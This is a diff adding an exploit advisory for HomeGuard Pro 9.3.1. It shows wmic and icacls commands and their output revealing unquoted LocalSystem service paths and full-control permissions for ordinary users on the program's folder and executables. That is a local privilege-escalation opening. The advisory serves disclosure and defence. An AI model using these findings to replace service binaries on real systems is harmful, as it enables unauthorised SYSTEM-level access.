@@ -1,0 +1,28 @@
+# Exploit Title: HomeGuard Pro 9.3.1 - Insecure Folder Permissions
+# Exploit Author: boku
+# Date: 2020-02-13
+# Vendor Homepage: https://veridium.net
+# Software Link: https://veridium.net/files_u/hg-pro/exe/HomeGuardPro-Setup.exe
+# Version 9.3.1
+# Tested On: Windows 10 (32-bit)
+
+# HomeGuard Pro v9.3.1 - Unquoted Service Path + Insecure Folder/File/Service Permissions
+
+## Service Information (Unquoted Service Path)
+C:\>wmic service get Name,PathName,StartMode,StartName | findstr /v "C:\Windows" | findstr /i /v """
+Name            PathName                                       StartMode    StartName
+HG52 AM VI      C:\Program Files\HomeGuard Pro\vglset.exe      Auto         LocalSystem
+HG52 AMC        C:\Program Files\HomeGuard Pro\vglsetw.exe     Auto         LocalSystem
+HG52 AM REM     C:\Program Files\HomeGuard Pro\vglrem.exe      Auto         LocalSystem
+HG52 AM SRV     C:\Program Files\HomeGuard Pro\vglserv.exe     Auto         LocalSystem
+
+## Insecure Folder Permission
+C:\>icacls "C:\Program Files\HomeGuard Pro" | findstr /i "Users"
+C:\Program Files\HomeGuard Pro               BUILTIN\Users:(F)
+
+## Insecure File/Service Permission
+C:\>icacls "C:\Program Files\HomeGuard Pro\VGL*" | findstr /i "Users"
+C:\Program Files\HomeGuard Pro\vglrem.exe    BUILTIN\Users:(I)(F)
+C:\Program Files\HomeGuard Pro\VGLSERV.EXE   BUILTIN\Users:(I)(F)
+C:\Program Files\HomeGuard Pro\vglset.exe    BUILTIN\Users:(I)(F)
+C:\Program Files\HomeGuard Pro\vglsetw.exe   BUILTIN\Users:(I)(F)
